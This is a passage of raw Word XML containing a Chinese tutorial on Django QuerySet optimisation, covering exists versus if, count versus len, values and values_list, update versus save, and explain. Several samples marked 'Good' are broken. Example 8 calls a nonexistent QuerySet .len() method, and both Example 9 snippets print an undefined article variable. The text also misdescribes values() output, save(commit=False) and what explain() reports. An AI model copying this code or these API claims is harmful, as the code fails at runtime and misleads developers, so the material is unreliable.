        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 5: Good</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339F0746" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_list = Article.objects.filter(title__contains="django")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEE4BFF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if article_list.exists():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283F7E23" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Records found.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0B0BEF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA86E5B" w14:textId="26D6D736" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("No records")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149E961E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>: 判断查询结果是否存在到底用if还是exists取决于你是否希望缓存查询数据集复用，如果是用if，反之用exists。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F1B685" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DF3D9F2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>统计查询结果数量优选count方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFCD348" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>len()与count()均能统计查询结果的数量。一般来说count更快，因为它是从数据库层面直接获取查询结果的数量，而不是返回整个数据集，而len会导致queryset的执行，需要将整个queryset载入内存后才能统计其长度。但事情也没有绝对，如果数据集queryset已经在缓存里了，使用len更快，因为它不需要跟数据库再次打交道。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44425E1A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4120E97B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下面三个例子中，只有例7最差，尽量不要用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A11D081" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 6: Good</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3916A9A3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>count = Article.objects.filter(title__contains="django").count()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213E0E98" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17A3096D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 7:Bad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670F06C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>count = Article.objects.filter(title__contains="django").len()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E8903D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27E0A516" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 8: Good</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CF05A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_list = Article.objects.filter(title__contains="django")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F36523" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if article_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A9EBF3" w14:textId="5918D014" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("{} records found.".format(article_list.len()))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCDA211" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6ECF4961" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当queryset非常大时，数据请按需去取</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213EFAF6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当查询到的queryset的非常大时，会大量占用内存(缓存)。我们可以使用values和value_list方法按需提取数据。比如例1中我们只需要打印文章标题，这时我们完全没有必要把每篇文章对象的全部信息都提取出来载入到内存中。我们可以做如下改进（例9）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061C15DF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 9: Good</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06EA6430" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_list = Article.objects.filter(title__contains="django").values('title')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBF336F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if article_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398EB39A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(article.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5A09DD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24ECCCB2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_list = Article.objects.filter(title__contains="django").values_list('id', 'title')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A6918C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if article_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082E786D" w14:textId="2B75861B" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(article.title)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79CEA4E4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>: values和values_list返回的是字典形式字符串数据，而不是对象集合。如果不理解请不要乱用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0798C0FB" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A30244B"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另外还可以使用iterator()方法可以优化程序对内存的使用，其工作原理是不对queryset进行缓存，而是采用迭代方法逐一返回查询结果，但这有时会增加数据库的访问次数，新手一般也驾驭不了。我这里就不细讲了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C67346" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73ED132E" w14:textId="4F2A9C99" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6905C5EB" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更新数据库部分字段请用update方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D86AC1A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果需要对数据库中的某条已有数据或某些字段进行更新，更好的方式是用update，而不是save方法。我们现在可以对比下面两个案例。例10中需要把整个Article对象的数据(标题，正文.....)先提取出来，缓存到内存中，变更信息后再写入数据库。而例11直接对标题做了更新，不需要把整个文章对象的数据载入内存，显然更高效。尽管单篇文章占用内存不多，但是万一用户非常多呢，那么占用的内存加起来也是很恐怖的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E314E5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 10: Bad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01074F23" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article = Article.objects.get(id=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416105C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Article.title = "Django"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064C1A31" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F58FC77" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B547706" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Example 11: Good</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52853238" w14:textId="43DA5DFC" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Article.objects.filter(id=10).update(title='Django')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE460D7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>update方法还会返回已更新条目的数量，这点也非常有用。当然事情也没有绝对，save方法对于单个模型的更新还是很有优势的，比如save(commit=False), article.author = request.user等等事情update都做不来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0663F16D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4331837E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>专业地使用explain方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8E48A5" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django 2.1中QuerySet新增了explain方法，可以统计一个查询所消耗的执行时间。这可以帮助程序员更好地优化查询结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9CDB55" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
